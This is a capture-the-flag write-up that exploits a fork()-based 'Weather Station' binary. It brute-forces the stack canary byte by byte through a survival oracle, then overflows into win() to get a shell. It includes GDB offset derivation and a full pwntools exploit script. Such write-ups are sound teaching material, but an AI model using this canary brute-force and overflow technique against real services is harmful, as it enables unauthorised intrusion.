## Weather Station - ret2win with Canary Brute-Forced

This challenge is structurally identical to Fortune Cookie: a `fork()`-based server with a stack buffer overflow and a canary that can be recovered byte-by-byte thanks to the shared memory guarantee of `fork()`. The only meaningful difference is a two-prompt protocol that must be satisfied before the overflow is reachable.

### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow with canary brute-force via a fork-based oracle. The artifacts provided are the `weather_station` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a fork-based canary brute-force because the server forks on each connection, a `read_query()` function reads 256 bytes into a 48-byte buffer, and the child prints `"Forecast sent!\n"` only when it survives, which is exactly the oracle condition needed.

### Phase 1 - Reconnaissance & Enumeration

Run `checksec` to confirm the protection picture:

```bash
checksec --file ./weather_station
```

Then read `main.c` and identify three things: where the overflow occurs (`read_query()`, which reads 256 bytes into `query[48]`), what the oracle message is (`"Forecast sent!\n"`, printed only when the child survives the canary check), and how many prompts precede the overflow (two: the location prompt first, then the forecast query prompt where the overflow lives).

### Phase 2 - Vulnerability Identification

The vulnerability is a classic stack buffer overflow with no bounds check in `read_query()`. The canary is present but recoverable via the fork oracle for exactly the same reason as in Fortune Cookie: every child process is an exact memory copy of the parent, so the canary value is constant across all connections for the lifetime of the server. The two-prompt protocol is not a security measure, it just means the brute-force loop must satisfy the location prompt before reaching the overflow on every connection attempt.

### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Stack buffer overflow with canary in a fork() server
GOAL: Redirect execution to win() and get a shell
APPROACH:
  Step 1: Brute-force the 7 unknown canary bytes using "Forecast sent!" as the oracle
  Step 2: On each attempt, satisfy the location prompt first, then send padding + guess
  Step 3: Reconstruct the full canary and send the final payload with canary + ret gadget + win()
TOOLS: pwntools, GDB + pwndbg, nm, ROPgadget
RISK OF FAILURE: timeout too short on slow connections; wrong prompt delimiter truncating the send
```

### Phase 4 - Exploit Development

#### Finding Offsets from Disassembly

Rather than using `cyclic`, the offsets can be read directly from the disassembly in GDB, which is faster when the frame layout is visible in the prologue:

```bash
gdb ./weather_station
pwndbg> break read_query
pwndbg> run
pwndbg> disassemble
```

Two instructions reveal everything:

```
lea rcx, [rbp - 0x40]   ← buffer starts at rbp-0x40
mov [rbp - 0x8], rax    ← canary stored at rbp-0x8
```

The offset from the buffer to the canary is therefore `0x40 - 0x8 = 56`, and the offset to RIP follows from the standard formula:

```
OFFSET_TO_CANARY = 56
OFFSET_TO_RIP    = 56 + 8 (canary) + 8 (saved RBP) = 72
```

#### Gathering Addresses

Since PIE is off, both addresses are static:

```bash
nm ./weather_station | grep win
ROPgadget --binary ./weather_station | grep ": ret$"
```

#### Two-Prompt Protocol

Every connection attempt, including each brute-force probe, must satisfy the location prompt before the overflow prompt is reachable. The pattern is consistent across the brute-force loop and the final exploit:

```python
r.recvuntil(b"Enter your location: ")
r.send(b"AAAA\n")
r.recvuntil(b"forecast query: ")
r.send(payload)
```

#### Exploit Script

Two corrections are applied to the original: `HOST`/`PORT` and the hardcoded `OFFSECHOST`/`OFFSECPORT` values are replaced with the standard `HOSTNAME`/`PORT` constants, and the `try_guess()` helper function is preserved as it meaningfully isolates the oracle logic and keeps `main()` readable.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./weather_station')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 56
OFFSET_TO_RIP    = 72   # canary + saved RBP

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn(interactive=False):
    level = 'info' if interactive else 'error'
    if args.LOCAL:
        return remote('127.0.0.1', 5555, level=level)
    return remote(HOSTNAME, PORT, level=level)

def try_guess(guess):
    r = conn()
    r.recvuntil(b"Enter your location: ")
    r.send(b"AAAA\n")
    r.recvuntil(b"forecast query: ")
    r.send(b"A" * OFFSET_TO_CANARY + guess)
    try:
        data = r.recv(timeout=0.2)
    except EOFError:
        data = b""
    r.close()
    return b"Forecast sent!" in data

def main():
    # ── leak phase (canary brute-force) ───────────────────────────────────────
    known = b"\x00"

    for i in range(7):
        for bval in range(256):
            guess = known + bytes([bval])
            if try_guess(guess):
                known = guess
                log.success(f"byte {i+1}: {bval:#04x}")
                break

    canary = u64(known)
    log.info(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r = conn(interactive=True)
    r.recvuntil(b"Enter your location: ")
    r.send(b"AAAA\n")
    r.recvuntil(b"forecast query: ")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```

Once a shell is obtained, the flag is at:

```bash
cat /home/user/flag
```

